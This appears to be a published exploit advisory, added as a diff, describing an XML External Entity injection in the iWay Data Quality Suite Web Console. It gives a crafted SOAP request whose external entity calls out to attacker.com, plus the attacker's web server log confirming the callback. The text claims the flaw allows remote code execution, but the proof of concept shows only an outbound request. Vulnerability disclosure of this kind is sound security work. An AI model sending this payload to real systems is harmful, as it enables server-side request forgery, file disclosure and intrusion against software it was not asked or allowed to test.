@@ -1,0 +1,42 @@
+# Exploit Title: iWay Data Quality Suite Web Console 10.6.1.ga-2016-11-20 – XML External Entity Injection
+# Google Dork: N/A
+# Date: 2018-09-27
+# Exploit Author: Sureshbabu Narvaneni#
+# Author Blog : https://nullnews.in
+# Vendor Homepage: www.informationbuilders.co.uk
+# Software Link: http://www.informationbuilders.co.uk/products/integrity/dqsuite
+# Affected Version: 10.6.1.ga
+# Category: WebApps
+# Tested on: Win7 Enterprise x86/Kali Linux 4.12 i686
+# CVE : N/A
+
+# Technical Description:
+# iWay Data Quality Suite Web Console provides web services features. As there is no
+# validation present on the web services featured by product while processing
+# the user input an attacker can easily inject external entities in the SOAP request and can 
+# achieve the successful Remote Code Execution on the server
+
+# Proof Of Concept:
+
+> Access the iWay DQS Web Console application section.
+> Create an entry for web service and form a sample SOAP request.
+> Send below crafted request to the server to confirm the vulnerability
+
+<?xml version="1.0"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://attacker.com/xxetest">]>
+<soapenv:Envelope
+xml:soapenv="http://schemas.xmlsoap.org/soap/envelope"
+xmlns:ws="http://www.example.com/ws">
+<soapenv:Header/>
+<soapenv:Body>
+<ws:test>
+<ws:in>&xxe;</ws:in>
+</ws:test>
+</soapenv:Body>
+</soapenv:Envelope>
+
+> The below log shows that the web service component is vulnerable to XXE.
+
+root@MrR3boot:/var/www/html# tail -f /var/log/apache2/access.log
+1xx.xx.xxx.xx - - [25/Sep/2018:01:13:42 -0400] "GET /xxetest HTTP/1.0" 404
+474 "-" "-"
